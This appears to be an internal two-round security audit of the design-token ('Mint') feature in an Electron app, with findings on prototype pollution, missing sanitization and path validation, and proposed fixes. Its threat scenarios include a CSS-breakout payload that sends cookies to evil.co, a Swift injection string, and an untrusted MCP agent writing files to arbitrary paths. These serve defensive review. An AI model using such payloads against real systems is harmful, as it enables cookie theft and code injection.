# Mint Security Review — 2026-04-17

**Reviewer:** flint-security-reviewer
**Scope:** Mint surface (TokenManager, TokenPanel, TokenGrid, TokenHealthBar, TokenDetailPanel, token/ subtree, ContrastAuditPanel, useTokenUsage, tokenStore, related IPC handlers)

---

## Verdict: FIX

One HIGH prototype-pollution vulnerability must be remediated before SHIP. The Mint renderer surface itself is well-built; the attack surface that matters is in two main-process IPC handlers that consume user-controlled token names.

---

## Critical vulnerabilities

*(none — no SHIP blockers at critical tier)*

---

## High-severity

### H1. Prototype pollution via `tokens:approve-token` nested-path walker

- **Location:** `electron/main.ts:1130-1138`
- The handler splits user-controlled `tokenName` on `.` and walks `designTokens` with bracket assignment: `current[parts[i]] = {}`. A pending entry with `name: "__proto__.polluted"` walks into `Object.prototype` and mutates it. The `typeof ... !== 'object'` guard does not help — `Object.prototype` is an object. `constructor.prototype.x` is the equivalent second vector.
- **Impact:** main-process prototype pollution. Every subsequent `JSON.parse`-derived object in the Electron session carries the injected property. Any downstream `if (opts.someFlag)` check becomes attacker-controlled.
- **Fix:** reject `__proto__`, `constructor`, `prototype` segments; validate `tokenName` against `/^[a-zA-Z][a-zA-Z0-9_-]*(\.[a-zA-Z][a-zA-Z0-9_-]*)*$/`.

### H2. `flattenDTCG` + main-process `walk()` helpers are the ingress path for H1

- **Location:** `src/store/tokenStore.ts:81-115`, `electron/main.ts:910`, `electron/main.ts:1029`
- `JSON.parse` preserves `__proto__` as an own property on V8; `Object.entries` surfaces it; the walkers happily recurse into it and emit `token_path: "__proto__.x"` which flows into SQLite and eventually into the H1 handler.
- **Fix:** `if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue` in all three helpers.

---

## Medium-severity

### M1. `importTokensJSON` has no size cap, depth cap, or schema validation
- **Location:** `tokenStore.ts:272-293`
- A 100 MB paste or deeply-nested bomb freezes renderer + main process
- **Fix:** Cap input at ~2 MB, recursion at 32, batch the SQLite inserts

### M2. `tokens:create` / `tokens:update` accept any `token_value` verbatim
- **Location:** `electron/main.ts:760-822`
- Values reach inline `style` props (`boxShadow`, `fontFamily`, `animation`). React + browser property-setter dispatch neutralises common CSS-escape chains, but server-side validation is missing.
- **Fix:** Per-type regex validation. Reject `<`, `>`, `{`, `}`, `url(`, `expression(`.

### M3. Token names interpolated into `title` / `aria-label` (multiple files)
- React escapes these so practical risk is negligible; flagged for completeness.

### M4. `tokens:audit-contrast` runs O(N²) on the main thread
- **Location:** `electron/main.ts:1003-1091`
- No cap on `colorTokens.length`. 1000 tokens = ~1M pair iterations, blocks the main process.
- **Fix:** Cap at 200 or move to a worker.

---

## Low / hardening

- **L1.** `tokens:scan-usage` `collectFiles` (`main.ts:945-963`) follows symlinks — a malicious project's `.flint/link -> /` walks the filesystem up to `FILE_LIMIT = 500`. Skip symlinks and re-prefix-check each entry.
- **L2.** Error text flows through `role="alert"` — React-escaped, keep it that way.
- **L3.** Static `<style>` tag in `TokenGrid.tsx:205-210` is safe today but a footgun if anyone later interpolates a token value into it.
- **L4.** No CSV / clipboard path in Mint — zero formula-injection risk today.
- **L5.** `useTokenUsage` unmount cleanup is correct.
- **L6.** Figma OAuth material is NOT exposed. `preload.ts:30-76` returns only `{ running, lastWebhookAt, tokenCount, port }`. SEC.2 is honoured.
- **L7.** `mcp:read-resource` (`main.ts:3296-3304`) has no URI allowlist — not Mint-specific but Mint exercises it.

---

## What's already secure

- Process boundary intact (no Node imports in any Mint file)
- All CRUD routes through `window.flintAPI.tokens`
- No `dangerouslySetInnerHTML`
- Inline-style injection neutralised by single-property setters
- OAuth material stays in main
- Every `tokens:*` handler type-guards input
- SQL uses parameterised prepared statements and allowlisted SET clauses
- Writes go through `FileTransactionManager`
- Contrast audit is local-only

---

## Top recommendations (priority-ordered)

1. **Fix H1 + H2 together** (single-line changes in three files)
2. Fix M1 (paste size/depth caps + batch insert IPC)
3. Fix M4 (200-token cap on contrast pair computation)
4. Fix M2 (per-type regex validation in `tokens:create`/`update`)
5. Fix L1 (symlink skip in `collectFiles`)

---

## Mint Security Review — Round 2 (2026-04-17, extended scope)

**Reviewer:** flint-security-architect
**Scope delta vs Round 1:** added OAuth flow, three-way sync engine, all 5 emitters (CSS/Tailwind/Swift/Kotlin/RN), `flint_emit_tokens`, `flint_map_tokens`, `flint_extract_tokens`, `flint_approve_tokens`, ingestion endpoints, web-build parity, CHRON.1 sanitization comparison.

## Executive Summary

**Grade: C+ (conditional — two Critical findings must land before external beta).**

Round 1's H1/H2 prototype-pollution have been **remediated** (verified: `tokenStore.ts:81-85` blocks `__proto__`/`constructor`/`prototype`; `electron/main.ts:1115` enforces `SAFE_TOKEN_NAME_RE`; defense-in-depth at `main.ts:1149,1158`). OAuth is solid (PKCE S256, state nonce, loopback-only, `safeStorage`). SQL is parameterised. Ingestion auth + loopback binding are correct.

The remaining gap is **downstream of the write**: once `token_value` lands in the database or `.flint/design-tokens.json`, it's echoed verbatim into CSS/Tailwind/Swift/Kotlin and the preview iframe with zero escaping. There is no analogue to `shared/reasonSanitizer.ts` for token values — no length cap, no `\p{Cc}\p{Cf}` strip, no bidi-override filter, no URL-scheme allowlist, no per-target escape.

## Top-3 Findings by Attacker Leverage

| # | Finding | Leverage | File:line |
| --- | --- | --- | --- |
| 1 | **No sanitization on token_value write path.** `tokens:create`/`tokens:update` accept any string; ingestion + sync pull do the same. | A Figma variable name/value containing `\u202E`, NUL, or a CSS breakout sequence (`#f00; } body { background: url(javascript:…) } /*`) propagates into `.flint/design-tokens.json`, every emitter output, and the preview iframe `:root{}` block. CSS injection in committed artifacts; Trojan-Source against developers reading the tokens file. | `electron/main.ts:760-823`; `server/index.ts:762,791` (mirror gap); `extractTokens.ts:284-305`; `tokenFileIO.ts:98`; `tokenSyncEngine.ts:216-217`. |
| 2 | **Emitters echo values with zero per-target escaping.** `cssEmitter.formatCSSValue` only quotes font families; `tailwindEmitter.escapeValue` only escapes `\` and `'`; Swift/Kotlin have no string-literal escape. | Any user committing `flint_emit_tokens` output commits attacker-controlled code. `_report.json` lacks a provenance header. The `/* DO NOT EDIT */` banner ensures users won't audit. | `cssEmitter.ts:55-66`; `tailwindEmitter.ts:70-72`; `swiftEmitter.ts`; `kotlinEmitter.ts`. |
| 3 | **MCP token tools accept `projectRoot` without path validation.** `handleApproveTokens`, `handleEmitTokens`, `handleMapTokens`, `handleExtractTokens` take `projectRoot` verbatim, `fs.mkdirSync` + `fs.writeFileSync` anywhere. No symlink canonicalize, no home-dir guard. | An untrusted MCP agent can write `.flint/design-tokens.json` to arbitrary filesystem paths (compare `ast:save-file` at `main.ts:1263` which enforces `filePath.startsWith(home + path.sep)` — the MCP tools lack that guard). Composes with #1 to produce write-anywhere-then-poison-codegen. | `extractTokens.ts:254,300-305`; `emitTokens.ts:463-486`; `mapTokens.ts:138,193-206`. |

## Token Write-Path Sanitization: **NO** (confirmed)

Verified all 5 write entry points use raw strings with no sanitizer:

- **Electron IPC** — `electron/main.ts:760-823` (type-check only)
- **Web mirror** — `server/index.ts:762-830` (same handler, same gap)
- **Ingestion** — `electron/ingestion-server.ts:81-94` (raw normalizer output)
- **MCP approve** — `flint-mcp/src/tools/extractTokens.ts:284-305`
- **Sync pull** — `flint-mcp/src/core/sync/tokenFileIO.ts:98` + `tokenSyncEngine.ts:216-217`

CHRON.1 sanitizer is applied at `electron/main.ts:3885` and `:3922` for override reasons. **Not imported or applied anywhere in the Mint pipeline.** Mint is one layer behind CHRON.1 on ingress hygiene (length/control/bidi/secret) and adds an egress-escape gap that CHRON.1 doesn't face (Mint writes to generated code; CHRON.1 writes to SQLite only).

## Major Findings

- **M1 (sync auto-merge):** `tokenSyncEngine.executePull:213-221` auto-applies `modified_remote` with no approval prompt. A compromised or co-editor Figma account → attacker-controlled `token_value` in local tokens → finding #1 fires.
- **M2 (description field):** Free text, unsanitized, destined to flow into CSS `/* */` comments in future emitters. `*/` breaks out.
- **M3 (`_report.json` has no header):** `emitTokens.ts:486` — easier to PR-tamper.
- **M4 (OAuth cosmetic):** `figmaOAuth.ts:481` has a dummy timer in the settle path; smelly but not exploitable. `_fetchFileName` silently returns empty on error (line 557) — verify UI handles expired state.
- **M5 (`/ingest-ast` 10MB + deep AST):** Babel parse of a 10,000-node nested payload is a one-shot main-process stall. Not strictly Mint but reachable from the token pipeline.
- **M6 (inconsistent path grammar):** `SAFE_TOKEN_NAME_RE` exists at `main.ts:1115` but is only applied on approve. `tokens:create` accepts any string. `extractTokens.ts:272` accepts `incoming.path` with only a truthy check. Export to `shared/tokenPath.ts`, apply at every write.
- **M7 (no description secret scan):** If a user writes "TODO sk-ant-…" in a description, it commits to repo. Port CHRON.1 `SECRET_PATTERNS`.

## Minor

- `flint_map_tokens` writes to `outputPath` without extension allowlist (`mapTokens.ts:195`).
- `figmaApiService.ts:67,98` — URL is correctly scoped to `api.figma.com` + `encodeURIComponent(fileKey)`. Confirmed no SSRF.
- Ingestion 10MB/50MB caps consistent with SEC.6.

## Threat Scenarios

**Scenario 1 — Malicious Designer:** Co-editor pushes a Figma variable with value `#3b82f6; } :root { background:url(javascript:fetch('//evil.co/'+btoa(document.cookie))) } /*`. Victim `/tokens` pull auto-merges (M1). Victim emits CSS, commits, deploys. Value escapes the `--x:` rule into injected CSS. Root cause: finding #1.

**Scenario 2 — Untrusted MCP Agent:** Agent calls `flint_approve_tokens({ projectRoot: "/Users/victim", tokens: [{ path:"x", value:"\"; exit(1); //", type:"color" }] })`. Tool writes to arbitrary path (#3). Later `flint_emit_tokens --platform swift` emits unescaped value into `.swift` file — compilation-time code execution in victim's CI. Root cause: #1 + #3 composed.

**Scenario 3 — Trojan-Source tokens file:** Attacker introduces `\u202E` into a token path via `/ingest` (assuming they've obtained the per-session secret via another vector). Developer reads `.flint/design-tokens.json` in editor; bidi override mis-renders. CHRON.1 strips `\p{Cf}`; Mint does not.

## Comparison to CHRON.1-repair Sanitization Bar

| Dimension | CHRON.1 (reasons) | Mint (token values) |
| --- | --- | --- |
| Length cap (1000 chars) | `reasonSanitizer.ts:24` | **Absent** |
| `\p{Cc}` strip | `reasonSanitizer.ts:53` | **Absent** |
| `\p{Cf}` strip (bidi, zero-width) | Yes | **Absent** |
| Secret redaction (sk-ant-, ghp_, AKIA) | `SECRET_PATTERNS` | **Absent** |
| Enforcement at IPC boundary | `main.ts:3885,3922` | **None** |
| Web-build parity | Yes | **Missing on both** |
| Per-target egress escape | N/A (SQLite) | **Absent for CSS, Swift, Kotlin; partial Tailwind** |

**Verdict:** Mint is behind CHRON.1 on every ingress dimension, plus has an egress-escape class that CHRON.1 doesn't face. Match CHRON.1 ingress hygiene first; add per-emitter escape second.

## Recommended Sequencing

1. **Sprint 1 (ship-before-beta):** Port CHRON.1 → `shared/tokenValueSanitizer.ts`. Apply at `tokens:create`, `tokens:update`, `/ingest` normalizer, `tokenSyncEngine.executePull`, `handleApproveTokens`. Add `validateProjectRoot` for all 4 MCP tools. Land on both Electron and web handlers.
2. **Sprint 2:** Per-emitter escape functions. Fuzz harness (60 values: bidi, NUL, CSS/Swift/Kotlin breakout).
3. **Sprint 3:** M1 approval prompt on non-trivial pulls. Unify token-path grammar (M6). Description secret scan (M7).
4. **Sprint 4:** `_report.json` header (M3), description pre-sanitization (M2), extension allowlist on `outputPath`.

